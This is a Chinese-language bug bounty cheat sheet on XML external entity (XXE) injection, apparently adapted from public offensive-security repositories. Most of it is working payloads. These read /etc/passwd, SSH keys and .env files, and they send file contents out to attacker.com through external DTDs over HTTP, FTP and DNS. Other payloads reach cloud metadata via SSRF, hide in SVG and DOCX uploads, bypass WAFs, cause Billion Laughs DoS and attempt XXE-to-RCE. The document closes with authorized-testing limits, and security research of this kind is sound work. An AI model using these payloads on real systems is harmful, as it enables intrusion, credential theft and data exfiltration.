# XML 外部实体注入（XXE）

> 通过 XML 的 DTD 外部实体把「文件内容 / 内网资源」拉进解析结果。经典回显 = 文件读取，盲注 OOB = 外带数据，进一步可达 SSRF / 少数 RCE（PHP `expect://`、Java 反序列化 gadget）。Bug Bounty 赏金区间 $5,000–$30,000+（hunt-xxe）[Claude-BugHunter]。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（10 份公开报告提炼）
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)（源自 SnailSploit/offensive-checklist）
- 权威公开源：PayloadsAllTheThings / PortSwigger / HackTricks / OWASP

---

## 1. 触发信号

- 端点接受 XML：`Content-Type: application/xml` / `text/xml` / `application/soap+xml`，或 multipart 里的文件字段
- 文件上传（SVG / DOCX / XLSX / PPTX / PDF）后被服务端解析/缩略/转换
- JSON API 暗藏 XML 解析：把 `application/json` 换成 `application/xml` + 等价 XML body 仍被处理
- SOAP / WSDL / XML-RPC / SAML / RSS / sitemap 等遗留接口

## 2. 高频入口点

**URL 特征** `[Claude-BugHunter]`：`/api/v*/xml` `/upload` `/import` `/parse` `/convert` `/saml/acs` `/sso/saml` `/feed` `/rss` `/sitemap` `/webdav` `/soap/*` `/wsdl` `/service.asmx` `/xmlrpc`。

**响应头信号**：`Content-Type: application/xml` / `text/xml` / `application/soap+xml` / `multipart/form-data`（查上传字段）；`X-Content-Type-Options` 缺失 = 解析宽松信号。

**源码指纹** `[Claude-BugHunter]`：JS 里 `DOMParser` / `parseFromString` / `$.parseXML` / `xml2js` / `libxmljs`；后端 `simplexml_load_string` / `DOMDocument` / `DocumentBuilder` / `SAXParser` / `lxml` / `xml.sax`。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **先验 inline 实体**（判断解析器是否展开实体）：`<!ENTITY hello "world!">` + `&hello;` 看 `world!` 是否回显——不回显说明实体展开已禁用，SYSTEM file:// 也不会成功，别浪费 `[Claude-BugHunter]`。
2. **经典文件读**：`file:///etc/passwd`（Linux）/ `C:\Windows\win.ini`（Windows）看是否直接回显。
3. **无回显 → 盲 OOB**：实体指向你的 Collaborator/interactsh，看是否收到 DNS/HTTP 回调。
4. **盲 OOB → 外带文件**：两阶段参数实体 + 外部 DTD（见 4.2）。
5. **SSRF 枢轴**：实体指向 `169.254.169.254` / 内网 `10.x` / `127.0.0.1`，比对时序与报错差异。
6. **评估升级**：读最小敏感文件样本（`/etc/hostname`、`wp-config.php` 一行）即止；expect/XSLT RCE 仅授权证明。

## 4. Payload 区（每条标注出处）

### 4.1 经典文件读（有回显）`[本地 src-hunter]`

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

- Windows：`file:///c:/windows/win.ini`
- PHP 源码（base64 防特殊字符）：`php://filter/convert.base64-encode/resource=index.php`
- 敏感文件清单 `[本地 src-hunter]`：`/etc/shadow` `/etc/hosts` `/root/.ssh/id_rsa` `/proc/self/environ`、`wp-config.php` `/.env` `config/database.yml`

### 4.2 盲注 OOB（无回显）`[本地 src-hunter]`

**两步参数实体 + 外部 DTD**（核心盲打姿势）：

```xml
<!-- 注入端 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<foo>test</foo>
```

```xml
<!-- attacker.com/xxe.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

等价两段式（Claude-BugHunter 版）`[Claude-BugHunter]`：注入端 `%file` + `%dtd`，`evil.dtd` 里 `<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-SERVER/?data=%file;'>"> %all;`。

**错误消息外带（OOB 被封时）** `[本地 src-hunter]`：把文件内容塞进不存在路径，错误回显携带内容：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval; %error;
```

**DNS 外带（egress 只放行 53 端口）** `[Claude-BugHunter]`：`<!ENTITY % data SYSTEM "file:///etc/hostname"><!ENTITY % send "<!ENTITY exfil SYSTEM 'http://%data;.attacker.com/'>">`。

### 4.3 SSRF / 内网 `[本地 src-hunter]`

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
<!-- 端口扫描：http://192.168.1.1:22 / :80 / :443；内网服务：http://127.0.0.1:6379/info（Redis）-->
```

云 metadata 注意 `[Claude-Red]`：AWS IMDSv2 需先 PUT 拿 token 再带 `X-aws-ec2-metadata-token` 头——多数 XML 解析器发不了 PUT，经典 XXE 受限；GCP 需 `Metadata-Flavor: Google` 头；可用 `jar:`（Java）或同域 open redirect 链绕过。

### 4.4 文件上传（SVG / DOCX / XLSX）`[Claude-BugHunter]`

```xml
<!-- SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```

DOCX/XLSX 本质是 ZIP：解压后往 `[Content_Types].xml` 或 `word/document.xml` / `xl/workbook.xml` 注入 DOCTYPE，再重新打包上传 `[本地 src-hunter]`。OOB 案例（Open-Xchange .pptx）改 `ppt/slides/slide1.xml` 内嵌参数实体 `[Claude-BugHunter]`。

解压结构参考 `[本地 src-hunter]`：XLSX → `xl/workbook.xml` `xl/worksheets/sheet1.xml` `xl/sharedStrings.xml`；DOCX → `word/document.xml` `word/_rels/document.xml.rels`。也可改 `_rels/.rels` 或 `document.xml.rels` 注入。

### 4.5 XInclude（DOCTYPE 被拦时）`[Claude-Red]`

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### 4.6 Bypass 矩阵 `[Claude-BugHunter]`

| 拦 | 绕 |
|---|---|
| 关键字 `ENTITY`/`DOCTYPE`/`SYSTEM` | 大小写 `<\!DoCtYpE`；UTF-16 编码整包；参数实体替代通用实体 |
| `file://` 被封 | `php://filter/convert.base64-encode/resource=` / `netdoc:///`（Java）/ `jar:file:///`（Java）/ `gopher://` |
| WAF 拦 XXE 特征 | `Transfer-Encoding: chunked`、XML 注释断签名、`&#x66;&#x69;&#x6c;&#x65;:///` 嵌套编码 |
| Content-Type 校验 | `application/json; charset=xml` / `application/xml+json` / 省略 Content-Type 让服务端嗅探 |

**解析器生态快表**（决定值不值得打）`[Claude-BugHunter]`：Java SAX/DOM 未禁用外部实体 = 默认 YES；PHP `DOMDocument`+`LIBXML_NOENT` = YES；.NET ≥4.5.2 `DtdProcessing.Prohibit` = 默认安全；Python `xml.etree`/`lxml`/`defusedxml` = 默认 NO；Ruby Nokogiri 默认 NO。指纹信号：`Server: Apache Tomcat`/`X-Powered-By: Servlet` = Java 大概率 YES；先 `&hello;` inline 探针再决定打不打 SYSTEM。

### 4.7 SOAP / SAML 与 DoS（节选）`[Claude-Red]`

**SOAP 内嵌**：`<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>`。

**SAML AuthnRequest**：`<saml:Issuer>&xxe;</saml:Issuer>` 前注入 `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`。

**Billion Laughs（仅测解析上限，勿真打 DoS）** `[Claude-Red]`：
```xml
<!DOCTYPE data [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>
```

**XXE→RCE 路线** `[Claude-BugHunter]`：PHP `expect://id`（expect 扩展加载时）；Java XSLT 扩展 `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>`。均少见，需先确认语言与扩展。

### 4.8 多步外带 / CDATA / XInclude 变体 `[本地 src-hunter]`

```xml
<!-- 多步外带：CDATA 包住含特殊字符的文件内容 -->
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "%start;%file;%end;">
```

```xml
<!-- FTP 外带（HTTP 被封时） -->
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
```

```xml
<!-- CDATA 包裹实体 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo><![CDATA[&xxe;]]></foo>
```

**XInclude 经 namespace（DOCTYPE 被禁）** `[Claude-Red]`：
```xml
<ns1:root xmlns:ns1="http://example.com" xmlns:xi="http://www.w3.org/2001/XInclude">
  <ns1:data><xi:include parse="text" href="file:///etc/passwd"/></ns1:data>
</ns1:root>
```

**URL 编码 scheme 绕过** `[Claude-Red]`：`<!ENTITY xxe SYSTEM "file:%2F%2F%2Fetc%2Fpasswd">`。

## 5. 工具用法

```bash
# Content-Type 换 XML 测试 [Claude-BugHunter]
curl -X POST https://target.com/api/endpoint -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'

# 源码审计 [Claude-BugHunter]
grep -rn "simplexml_load_string\|DOMDocument\|xml_parse\|loadXML" .            # PHP
grep -rn "DocumentBuilder\|SAXParser\|XMLReader\|XMLInputFactory" .           # Java
grep -rn "lxml\|xml.sax\|parseString\|fromstring\|etree.parse" .              # Python
```

OOB 监听 `[Claude-Red]`：Burp Collaborator、interactsh、XXEinjector、XXE-FTP、dtd.gen、oxml_sec（OOXML 文件测试）。扫描：OWASP ZAP XXE scanner、Burp Pro、semgrep `java-xxe`/`python-xxe` 规则。

## 6. 证据要求

**「已确认」必须满足**：响应中出现 `/etc/passwd`（或 `/etc/hostname`）内容；或 OOB 回调携带文件内容回传到你的服务器；或到达内网/云 metadata 端点并有响应差异。仅「解析器发了 DNS 请求」= Low/Medium（只证明实体被解析），不是 Critical——Critical 需证明文件读取或内网 HTTP `[Claude-BugHunter]`。

**PoC 模板**：单条 `curl`/Burp Repeater 请求可 10 分钟内复现，响应含文件内容截图；盲打附 Collaborator 交互记录截图（含 exfil 参数里的数据）。

**CVSS 参考**：未认证文件读取 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5`；含内网 SSRF 升级 `C:H/I:L = 8.2`；XXE→RCE（如 CosmicSting CVE-2024-34102）`= 9.8` `[Claude-BugHunter]`。

**已披露案例锚点** `[Claude-BugHunter]`：Mail.ru RSS feed 文件读 #505947（$6,000）；Twitter SOAP/SXMP #248668（$10,080）；Zivver SVG 上传 XXE→SSRF #897244；Open-Xchange PPTX 盲 XXE #334488（$2,000）；Uber 盲 OOB #154096（$500）；Adobe Commerce CosmicSting CVE-2024-34102（CVSS 9.8）。

## 7. 合规边界 / 不要做的事

- **禁**：`expect://` 实际执行命令、写 webshell、billion laughs / quadratic blowup 打 DoS——「证明能」用文件读即可。
- **禁**：读 `/etc/shadow`、`.env`、DB 配置文件、`~/.ssh/id_rsa` 私钥全文；每类文件只读一行样本并脱敏。
- **禁**：OOB 外带完整敏感文件；只外带 `/etc/hostname` 或文件首行证明链路。
- **禁**：内网端口全量扫描 / 打内网管理面板写操作。
- **报告脱敏**：泄露的密钥/凭据只留 head/tail，路径可写但内容不抄全。
